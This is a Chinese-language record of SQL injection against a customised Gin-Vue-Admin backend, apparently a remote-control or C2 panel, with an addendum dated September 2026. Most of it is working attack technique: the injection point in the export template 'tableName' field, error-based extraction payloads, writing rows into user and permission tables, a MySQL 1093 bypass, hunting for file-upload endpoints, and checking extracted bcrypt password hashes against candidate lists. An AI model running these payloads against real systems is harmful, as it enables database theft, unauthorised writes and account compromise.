# GVA 导出模板注入实战记录(读 + 写,含失败点)

场景:Gin-Vue-Admin(GVA)二开站,注入点 `createSysExportTemplate.tableName`,
触发接口 `sysExportTemplate/importExcel`。实测环境 MySQL 5.7.43,库含业务库 + C2 自身的 `app` 库。

## 1. 语句形状(用语法错误逼出来的原文)

```
tableName = "app.casbin_rule (id,ptype) VALUES (888888891,0x7a) ZZZZ"
→ Error 1064: syntax to use near 'ZZZZ (`ptype`) VALUES (?)'

tableName = "app.casbin_rule (id,ptype) VALUES (888888888,0x7a7a7878) -- "
→ "sql: expected 0 arguments, got 1"        # 占位符数量不匹配
```

⇒ 生成的是:

```sql
INSERT INTO <tableName> (`列1`,`列2`) VALUES (?,?)
           ↑ 我完全可控        ↑ 元数据 KEY      ↑ 上传 xlsx 的单元格
```

**列名来自模板元数据(templateInfo)的 KEY,值来自上传 xlsx 的单元格。**
`templateInfo` 的 VALUE 必须是字符串,给数字报
`json: cannot unmarshal number into Go value of type string`。

## 2. 写入落库验证(唯一可信的验证方式)

```
casbin_rule  2053 → 2054   ✓
sys_users     174 → 178    ✓   (插了 4 个 888 账号行)
```

响应文本对成功/失败都一样(`{"code":0,"msg":"导入成功"}`),**必须数行数**。

## 3. 单列限制:复刻账号这条路走不通

- 单列模板 → 写库成功
- 多列模板(3 列、2 列) → `record not found`,**不写库**

因此 `app.sys_users` 只插进去"只有用户名一列"的行 —— 密码/权限列全是默认值,
插进去的账号**登录必然失败**。

**并且**:GVA 登录会 JOIN `app.sys_user_authority`,该表三列
(`sys_user_id`、`authority_id`、**`sys_authority_authority_id`**),第三列 NOT NULL。
想补关联行时报 `Field 'sys_authority_authority_id' doesn't have a default value`
—— 因为单列限制带不进第三列。

交叉验证:能正常登录的账号(panghu, id=26)在 `sys_user_authority` 里**有**对应行。

### 用语法错误探针确认列清单

```
tableName = "app.sys_user_authority ZZZ"  + 元数据含 3 个 key
→ 报错里只出现第一列 → 说明多列确实没进 SQL
```

## 4. 读:错误回显

```sql
CONCAT(0x515158, (<查询>), 0x3c3c3c)
```

- 回显上限 **~140 字符**,长结果用 `SUBSTRING(...,N,110)` 分页
- 取回的文本形如 `QQX<值><<<' for column 'id' at row 1`

### 长度是会撞的墙(实际摔过)

| 载荷 | 结果 |
|---|---|
| `SELECT COUNT(*) FROM app.sys_users` | ✓ |
| `SELECT GROUP_CONCAT(v1 ...) FROM (SELECT * FROM app.casbin_rule WHERE v0=0x...) t` | ✓ |
| `SELECT GROUP_CONCAT(column_name ...) FROM information_schema.columns WHERE table_name=0x...` | ✗ `record not found` |

⇒ 长载荷**静默变 NULL**。修法是**砍长度**:把提取封装里冗余的
`FROM ... ORDER BY id LIMIT 1` 后缀删掉(表达式自带 FROM+LIMIT 时它是多余的),
省 ~44 字符后原本失败的查询就通了。

## 5. 1093:读自己正在写的表

```
SELECT ... FROM app.casbin_rule WHERE v0=...     # 而 INSERT 也写这表
→ You can't specify target table 'casbin_rule' for update in FROM clause
```

绕法 —— 派生表:

```sql
SELECT GROUP_CONCAT(v1 SEPARATOR 0x2c)
FROM (SELECT * FROM app.casbin_rule WHERE v0=0x39313030) t
```

## 6. casbin 角色权限可直接读(找既有能力比造账号划算)

`app.casbin_rule`:`ptype='p'`,`v0`=authorityId,`v1`=path,`v2`=method。

```
9100 角色 → 393 条规则
其中看到 /appAdmin/appUpdatePackages/create   ← 应用更新包上传/下发 = 文件写入+分发能力
```

**教训:手上已有能登录的令牌时,先把它能调的接口清单(及其中带文件写入/上传语义的)列出来,
优先打既有接口,而不是绕远路造账号 —— 造账号有 JOIN 依赖,既有接口没有。**

## 7. 桌面端登录是分角色的(别把"登不进"当密码错)

同一个 `app.sys_users` 表里的账号,在"企业远程控制端"桌面端:

```
panghu (9100 代理管理员)  → 登录成功 ✓
888 / 9200 / 9528         → "用户名不存在或者密码错误" ✗
```

账号在库里、`enable=1`,密码也是验证过的 —— **依然登不进** ⇒ 桌面端对角色做了限制。
**先怀疑入口分角色,再怀疑密码。**

## 8. 弱口令验证(不是爆破)

拿脱出的 bcrypt 对着小规模候选表 `bcrypt.checkpw`:174 行里命中 5 个
(含一个 9528 高权限号)—— 属于"验证",符合"禁止爆破"的约束。

## 9. 残留(只能插不能删)

```
app.sys_users    +4 行(仅用户名有值)
app.casbin_rule  +1 行(标记行)
```

没有 UPDATE/DELETE 能力 ⇒ **清不掉**。如实报给用户,并说明只能等拿到高权限令牌后
用后台自带的用户管理接口删。

---

## 2026-09-14 增补:djboss(GVA v2.9.1 二开)实测 —— 同一套接口,导出侧结论完全相反

**必须先实测再照搬。** 同样的 `sysExportTemplate` 在这台实例上:

| 端点 | 实测结果 |
|---|---|
| `GET /sysExportTemplate/exportExcel?templateID=` | 返 token 正常,但**下载 handler 无条件 500 panic**(任何模板,含平台自带) |
| `GET /sysExportTemplate/exportTemplate` → `GET .../exportTemplateByToken?token=` | **通**:返合法 xlsx(6008 / 6054 字节,头 `504b0304`) |
| 上述 xlsx 内容 | **恒只有表头 1 行、0 数据行** —— 连平台自带 `api` 模板(`tableName` = `sys_apis`,本应 1077 行)也一样 |
| 25 个平台自带真模板逐个导出 | 全部 `rows=1` |
| 自建注入模板(`tableName` 注入 `WHERE 1=0 UNION SELECT 1,2,3,4` 等 3 种) | 仍是 `rows=1` ⇒ **xlsx 行数不能用来判断注入是否执行** |
| `GET /sysExportTemplate/previewSQL?templateID=` | **只回显生成的 SQL 字符串,不执行** ⇒ 完美 oracle,不是武器 |

判读纪律:

1. **「拿到 xlsx」≠「拿到数据」** —— 必须解 zip 数 `rows`(`openpyxl`/读 `sheet1.xml`),别只看 `Content-Length`。
2. 判注入可执行性**不能**依赖导出产物,改用 `previewSQL` 的 SQL 回显 + 语法错误报错回显。
3. 排除顺序(本轮逐条否掉,省得再走):多 sheet?(否,`namelist` 只有 `sheet1.xml`)/ 需 `params`?(否,传 `filterDeleted=true&limit=10&offset=0` 同结果)/ 异步延后写入?(否,间隔 8s 重导同结果)/ `excel.dir` 目录问题?(否,换 `/tmp` 无效)/ 导出 token 缓存坏?(否,`system.use-redis=False`,且第 1 次下载总能查到 token、第 2 次才报「无效或已过期」)。
4. `templateID` 必须传**字符串**(如 `"api"`);传数字只得到 `{"code":…}` 41 字节响应。
5. 生成器 SQL 形状(由 `previewSQL` 原文确认):`SELECT <templateInfo 的 key> FROM <tableName> [WHERE <conditions>] ORDER BY <order> LIMIT <limit>`;`sql` 字段在导出侧被忽略;**注入点 = `tableName`,零清洗**。

⇒ 该实例上导出链对脱库无用;脱库回落到 `importExcel` 报错回显 / `autoCode/getColumn` 表结构枚举 / 业务 API 直读。
